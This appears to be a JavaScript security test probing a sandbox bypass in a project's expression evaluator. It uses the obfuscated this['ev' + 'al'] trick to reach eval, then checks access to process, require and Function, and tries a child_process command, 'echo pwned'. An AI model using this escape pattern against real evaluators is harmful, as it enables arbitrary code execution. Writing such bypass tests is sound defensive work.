import { runExpression } from '../src/engine/evaluator.js';
import { SAFE_SECURITY_CONFIG } from '../src/security/config.js';

console.log('=== CRITICAL BYPASS ANALYSIS ===\n');

const testContext = {
  field1: 'test',
  Math: Math,
  String: String
};

console.log('1. Confirming the bypass');
const result1 = runExpression('this["ev" + "al"]("Math.random()")', testContext, SAFE_SECURITY_CONFIG);
console.log(`this["ev" + "al"] bypass result: ${JSON.stringify(result1)}`);

console.log('\n2. Testing eval availability in context');
const result2 = runExpression('typeof this.eval', testContext, SAFE_SECURITY_CONFIG);
console.log(`typeof this.eval: ${result2}`);

console.log('\n3. Testing what "this" contains in secure context');
const result3 = runExpression('Object.keys(this)', testContext, SAFE_SECURITY_CONFIG);
console.log(`Object.keys(this): ${JSON.stringify(result3)}`);

console.log('\n4. Testing global object access through this');
const result4 = runExpression('this.global', testContext, SAFE_SECURITY_CONFIG);
console.log(`this.global: ${JSON.stringify(result4)}`);

console.log('\n5. Testing process access through this');
const result5 = runExpression('this.process', testContext, SAFE_SECURITY_CONFIG);
console.log(`this.process: ${JSON.stringify(result5)}`);

console.log('\n6. Can we execute arbitrary code?');
const result6 = runExpression('this["ev" + "al"]("1+1")', testContext, SAFE_SECURITY_CONFIG);
console.log(`Arbitrary code execution (1+1): ${result6}`);

console.log('\n7. Can we access dangerous functions?');
const result7 = runExpression('this["ev" + "al"]("require")', testContext, SAFE_SECURITY_CONFIG);
console.log(`Access to require: ${JSON.stringify(result7)}`);

console.log('\n8. Function constructor access');
const result8 = runExpression('this["ev" + "al"]("Function")', testContext, SAFE_SECURITY_CONFIG);
console.log(`Access to Function: ${JSON.stringify(result8)}`);

console.log('\n9. Can we run system commands?');
const result9 = runExpression('this["ev" + "al"]("require(\\"child_process\\").exec(\\"echo pwned\\")")', testContext, SAFE_SECURITY_CONFIG);
console.log(`System command execution: ${JSON.stringify(result9)}`);

console.log('\n10. Testing complete context escape');
// Try to get the actual global object
const result10 = runExpression('this["ev" + "al"]("(function(){return this})()")', testContext, SAFE_SECURITY_CONFIG);
console.log(`Global object access: ${JSON.stringify(result10)}`);

console.log('\n=== CRITICAL ANALYSIS COMPLETE ===');
